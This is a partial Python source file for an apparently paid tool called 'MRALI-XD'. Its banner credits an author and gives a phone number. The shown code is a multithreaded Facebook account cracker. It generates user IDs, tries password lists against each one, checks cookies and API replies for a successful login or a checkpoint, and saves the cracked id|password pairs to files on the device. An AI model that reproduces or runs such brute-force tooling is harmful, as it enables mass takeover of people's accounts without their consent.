...
logo=("""\033[1;37m
  .
.88b  d88. d8888b.  .d8b.  db      d888888b 
88'YbdP`88 88  `8D d8' `8b 88        `88'   
88  88  88 88oobY' 88ooo88 88         88    
88  88  88 88`8b   88~~~88 88         88    
88  88  88 88 `88. 88   88 88booo.   .88.   
YP  YP  YP 88   YD YP   YP Y88888P Y888888P 
----------------------------------------------
 Author    : MR ALI
 Github    : mrali-404
 Whatsapp  : +1(913)399-4497
 Tool type : PAID
----------------------------------------------
 For Haters: Fuck you 😈
\033[1;37m----------------------------------------------""")
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as Mrali:     
                        clear()
                        tl = str(len(user))
                        ...
                        for psx in user:
                                ...
                                Mrali.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [MRALI-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        Mrali=session.cookies.get_dict().keys()
                        if "c_user" in Mrali:
                                print('\r\r\033[1;32m [MRALI-OK] %s | %s'%(ids,pas))
                                open('/sdcard/MRALI-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Mrali:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [MRALI-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRALI-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [MRALI-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRALI-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[MRALI-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                ...
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [MRALI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRALI-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [MRALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/MRALI-R-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
